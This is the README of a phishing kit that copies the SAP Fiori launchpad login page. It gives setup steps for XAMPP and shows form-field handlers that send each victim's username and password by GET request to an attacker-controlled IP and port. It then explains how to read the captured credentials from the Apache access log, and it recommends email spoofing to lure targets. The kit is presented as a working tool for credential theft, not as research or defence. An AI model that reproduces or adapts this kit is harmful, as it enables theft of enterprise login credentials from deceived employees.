# Fiori launchpad spoofing (Phishing) 
## Project Description
FLPS is a set of HTML Pages with Javascript spoofing the SAP Fiori launchpad. 
The current version redirects to a hardcoded IP and stores the Credentials in the access log,
as they will be sent back via GET Request.
## Table of contents
1. Prerequisites</br>
2. Install</br>
3. Usage</br>
4. Contributing</br>
5. License</br>
## 1. Prerequisites
The current version was only tested on Windows 10 running XAMPP. 
1. Install XAMPP</br>
Download and run the installer from apachefriends (to be found [here](https://www.apachefriends.org/de/index.html))
2. Run XAMPP</br>
Start the Apache webserver
## 2. Install
Clone this Repo to the htdocs folder of XAMPP
```bash
cd C:\xampp\htdocs
```

```bash
git clone https://github.com/JonathanStross/sap_flp_spoofing.git
```
Currently, IP Adresses are hardcoded. Therefor, you need to adjust the Logon.htm file: 
```HTML
Line 10: <... href="TARGETSYSTEM:44300/sap/public/bc/ui2/logon/img/favicon.ico"
Line 20: <... action="TARGETSYSTEM:44300/sap/bc/ui2/flp?_sap-hash=JTIzU2hlbGwtaG9tZQ"
Line 31: <... onblur=storeUsername('YOURIP:APACHEPORT')>
Line 32: <... onblur=storePassword('YOURIP:APACHEPORT')>
Line 35: <... onclick=storeValues('YOURIP:APACHEPORT')>
```
You can find your IP by asking google or using CMD:
```bash
ipconfig
```
The port of apache is being displayed in the admin panel of XAMPP.
## 2. Usage
Key to success with any kind of phishing is to make the target believe it is the valid page. Therefor, you can utilize for example email spoofing. A documentation on email spoofing is to be found [here](https://letmegooglethat.com/?q=email+spoofing+with+kali).
<br><br>When a Victim has entered his Credentials, you can read the credentials in the access.log of the apache server. To see the logs, go to the adminpanel and click on the Logs Button and select the access.log. Scroll to the bottom of the log, the last two entries should be a GET request with the parameters ?Password=XYZ and ?Username=XYZ.
## 3. Contributing
Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.
You can request a feature by directly contacting me or opening an issue.
## 4. License
[MIT](https://choosealicense.com/licenses/mit/)
